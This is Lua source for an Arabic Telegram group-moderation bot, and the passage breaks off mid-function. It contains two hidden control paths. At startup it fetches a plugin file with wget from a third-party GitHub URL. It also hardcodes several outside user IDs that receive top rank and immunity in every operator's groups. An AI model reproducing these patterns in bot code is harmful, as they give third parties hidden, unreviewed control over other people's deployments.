redis = require('redis') 
https = require ("ssl.https") 
serpent = dofile("./library/serpent.lua") 
json = dofile("./library/JSON.lua") 
JSON  = dofile("./library/dkjson.lua")
URL = require('socket.url')  
utf8 = require ('lua-utf8') 
database = redis.connect('127.0.0.1', 6379) 
id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
--------------------------------------------------------------------------------------------------------------
local AutoSet = function() 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    
file:close()  
end  
if not database:get(id_server..":token") then
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\27[0;33;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n27[0;39;49m')
database:set(id_server..":SUDO:ID",SUDOID)
else
print('\27[0;31m╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end 
io.write('\27[1;31m ↓ ارسل معرف المطور بدون :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
else
print('\n\27[1;34m لم يتم حفظ معرف المطور :')
end 
os.execute('lua DRAGON.lua')
end
local create_config_auto = function()
config = {
token = database:get(id_server..":token"),
SUDO = database:get(id_server..":SUDO:ID"),
UserName = database:get(id_server..":SUDO:USERNAME"),
 }
create(config, "./AZIZA.lua")   
end 
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("DRAGON", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/DRAGON
token="]]..database:get(id_server..":token")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
echo "TG IS NOT FIND IN FILES BOT"
echo "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸ ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸ ┉"
exit 1
fi
if [ ! $token ]; then
echo "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸ ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸ ┉ ┉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE AZIZA.lua \e[0m"
echo "╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
exit 1
fi
echo -e "\033[38;5;208m"
echo -e "                                                  "
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./DRAGON.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/DRAGON
while(true) do
rm -fr ../.telegram-cli
screen -S DRAGON -X kill
screen -S DRAGON ./DRAGON
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
end 
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "Info"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
local load_redis = function()  
local f = io.open("./AZIZA.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
database:del(id_server..":token")
database:del(id_server..":SUDO:ID")
end  
local config = loadfile("./AZIZA.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
print([[

                                                                                            
                                                                                            
          
                                                                                            
                                                                                            
╔══╗╔╗─╔══╗╔══╗
║╔╗║║║─║═╦╝║╔╗║
║╠╣║║╚╗║╔╝─║╠╣║
╚╝╚╝╚═╝╚╝──╚╝╚╝


                                                                                            
                                                                                            
                                                                                            
                                                                                            
                                                                                                                                                                                                                                                                                                                                                                     
                                                                                            

           ch > @so_alfaa                                                                                                                
                                                                                                  
]])
sudos = dofile("./AZIZA.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO}
bot_id = sudos.token:match("(%d+)")  
token = sudos.token 
--- start functions ↓
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/MADISON11110/ALFAA/main/File_Bot/commands.lua") 
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
sudo_users = {SUDO,1208165035, 1744308503,70,70,30,50}   
function SudoBot(msg)  
local DRAGON = false  
for k,v in pairs(sudo_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
DRAGON = true  
end  
end  
return DRAGON  
end 
function DevSoFi(msg) 
local hash = database:sismember(bot_id.."Dev:SoFi:2", msg.sender_user_id_) 
if hash or SudoBot(msg) then  
return true  
else  
return false  
end  
end
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function Sudo(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
end
function CoSu(msg)
local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function BasicConstructor(msg)
local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Manager(msg)
local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function cleaner(msg)
local hash = database:sismember(bot_id.."S00F4:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Mod(msg)
local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Special(msg)
local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
end
function Can_or_NotCan(user_id,chat_id)
if tonumber(user_id) == tonumber(1208165035) then  
var = true
elseif tonumber(user_id) == tonumber( 1744308503) then
var = true
elseif tonumber(user_id) == tonumber(70) then
var = true
elseif tonumber(user_id) == tonumber(70) then
var = true
elseif tonumber(user_id) == tonumber(30) then
var = true
elseif tonumber(user_id) == tonumber(50) then
var = true
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = true  
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = true  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Biasic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'S00F4:MN:TF'..chat_id, user_id) then
var = true 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = true  
elseif database:sismember(bot_id..'Mamez:User'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
function Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(1208165035) then  
var = 'مبرمج السورس'
elseif tonumber(user_id) == tonumber( 1744308503) then
var = 'مبرمج السورس'
elseif tonumber(user_id) == tonumber(70) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(70) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(50) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(30) then
var = 'مطور السورس'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'  
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = "المطور الاساسي²"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المطور'  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'الفا'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشئ اساسي'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنشئ'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المدير'  
elseif database:sismember(bot_id..'S00F4:MN:TF'..chat_id, user_id) then
var = 'منظف' 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمن'  
elseif database:sismember(bot_id..'Mamez:User', user_id) then
var = database:get(bot_id.."Mamez:Rd"..msg.chat_id_) or 'مميز عام'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المميز'  
else  
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'العضو'
end  
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_User(Chat_id,User_id) 
if database:sismember(bot_id..'Muted:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_User(Chat_id,User_id) 
if database:sismember(bot_id..'Ban:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function GBan_User(User_id) 
if database:sismember(bot_id..'GBan:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function Gmute_User(User_id) 
if database:sismember(bot_id..'Gmute:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function getcustom(msg,scc)
local var = "لايوجد"
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..scc.sender_user_id_)
GeId = JSON.decode(Ge)
if GeId.result.custom_title then
var = GeId.result.custom_title
end
return var
end
function getbio(User)
local var = "لايوجد"
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchat?chat_id="..User)
data = json:decode(url)
if data.result.bio then
var = data.result.bio
end
return var
end
function AddChannel(User)
local var = true
if database:get(bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end

function dl_cb(a,d)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function chat_kick(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function PinMessage(chat, id)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(chat).ID,
message_id_ = id,
disable_notification_ = 0
},function(arg,data) 
end,nil)
end
function UnPinMessage(chat)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(chat).ID
},function(arg,data) 
end,nil)
end
local function GetChat(chat_id) 
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
},cb, nil) 
end  
function getInputFile(file) 
if file:match('/') then infile = {ID = "InputFileLocal", path_ = file} elseif file:match('^%d+$') then infile = {ID = "InputFileId", id_ = file} else infile = {ID = "InputFilePersistentId", persistent_id_ = file} end return infile 
end
function ked(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
local function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
end
local function Send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
local function GetInputFile(file)  
local file = file or ""   if file:match('/') then  infile = {ID= "InputFileLocal", path_  = file}  elseif file:match('^%d+$') then  infile = {ID= "InputFileId", id_ = file}  else  infile = {ID= "InputFilePersistentId", persistent_id_ = file}  end return infile 
end
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra) 
tdcli_function ({  ID = request_id,    chat_id_ = chat_id,    reply_to_message_id_ = reply_to_message_id,    disable_notification_ = disable_notification,    from_background_ = from_background,    reply_markup_ = reply_markup,    input_message_content_ = input_message_content,}, callback or dl_cb, extra) 
end
local function sendAudio(chat_id,reply_id,audio,title,caption)  
tdcli_function({ID="SendMessage",  chat_id_ = chat_id,  reply_to_message_id_ = reply_id,  disable_notification_ = 0,  from_background_ = 1,  reply_markup_ = nil,  input_message_content_ = {  ID="InputMessageAudio",  audio_ = GetInputFile(audio),  duration_ = '',  title_ = title or '',  performer_ = '',  caption_ = caption or ''  }},dl_cb,nil)
end  
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) 
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = disable_notification,from_background_ = from_background,reply_markup_ = reply_markup,input_message_content_ = {ID = "InputMessageDocument",document_ = getInputFile(document),caption_ = caption},}, dl_cb, cmd) 
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)  
local input_message_content = {   ID = "InputMessageVoice",   voice_ = getInputFile(voice),  duration_ = duration or 0,   waveform_ = waveform,    caption_ = caption  }  sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo,caption)   
tdcli_function ({ ID = "SendMessage",   chat_id_ = chat_id,   reply_to_message_id_ = reply_to_message_id,   disable_notification_ = disable_notification,   from_background_ = from_background,   reply_markup_ = reply_markup,   input_message_content_ = {   ID = "InputMessagePhoto",   photo_ = getInputFile(photo),   added_sticker_file_ids_ = {},   width_ = 0,   height_ = 0,   caption_ = caption  },   }, dl_cb, nil)  
end
function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "so_alfaa ")
local NameUser = "◉ بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "◉ المستخدم ← ["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"◉ الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
function Total_Msg(msgs)  
local DRAGON_Msg = ''  
if msgs < 100 then 
DRAGON_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
DRAGON_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
DRAGON_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
DRAGON_Msg = 'متفاعل' 
elseif msgs < 1200 then 
DRAGON_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
DRAGON_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
DRAGON_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
DRAGON_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
DRAGON_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
DRAGON_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
DRAGON_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
DRAGON_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
DRAGON_Msg = 'رب التفاعل'  
end 
return DRAGON_Msg 
end
function Get_Info(msg,chat,user) 
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "creator" then
Send(msg.chat_id_,msg.id_,'\n◉ مالك الجروب')   
return false  end 
if Json_Info.result.status == "member" then
Send(msg.chat_id_,msg.id_,'\n◉ مجرد عضو هنا ')   
return false  end
if Json_Info.result.status == 'left' then
Send(msg.chat_id_,msg.id_,'\n◉ الشخص غير موجود هنا ')   
return false  end
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '✔️'
else
info = 'x'
end
if Json_Info.result.can_delete_messages == true then
delete = '✔️'
else
delete = 'x'
end
if Json_Info.result.can_invite_users == true then
invite = '✔️'
else
invite = 'x'
end
if Json_Info.result.can_pin_messages == true then
pin = '✔️'
else
pin = 'x'
end
if Json_Info.result.can_restrict_members == true then
restrict = '✔️'
else
restrict = 'x'
end
if Json_Info.result.can_promote_members == true then
promote = '✔️'
else
promote = 'x'
end
Send(chat,msg.id_,'\n- الرتبة : مشرف  '..'\n- والصلاحيات هي ↓ \n━━━━━━━━━━'..'\n- تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n- مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'DRAGON Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"DRAGON":"'..NAME..'",'
else
t = t..',"'..v..'":{"DRAGON":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد جروبات التي في البوت { '..#list..'}')
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function Addjpg(msg,chat,ID_FILE,File_Name)
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,'./'..File_Name,'تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..File_Name) 
end
function Addvoi(msg,chat,vi,ty)
local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, './'..ty)   
os.execute('rm -rf ./'..ty) 
end
function Addmp3(msg,chat,kkl,ffrr)
local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀")  
os.execute('rm -rf ./'..ffrr) 
end
function Addsticker(msg,chat,Sd,rre)
local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, './'..rre)
os.execute('rm -rf ./'..rre) 
end
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_," ◉  ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," ◉  جاري ...\n ◉  رفع الملف الان")
else
send(chat,msg.id_,"* ◉ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Chek:Groups',idg)  
database:set(bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id..'Constructor'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id..'Manager'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id..'Mod:User'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id..'Basic:Constructor'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n ◉ تم رفع الملف بنجاح وتفعيل الجروبات\n ◉ ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n ◉ العضــو ← '..Name..'\n ◉ قام بالتكرار هنا وتم طرده '  
sendText(msg.chat_id_,Text,0,'md')
chat_kick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if type == 'del' then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
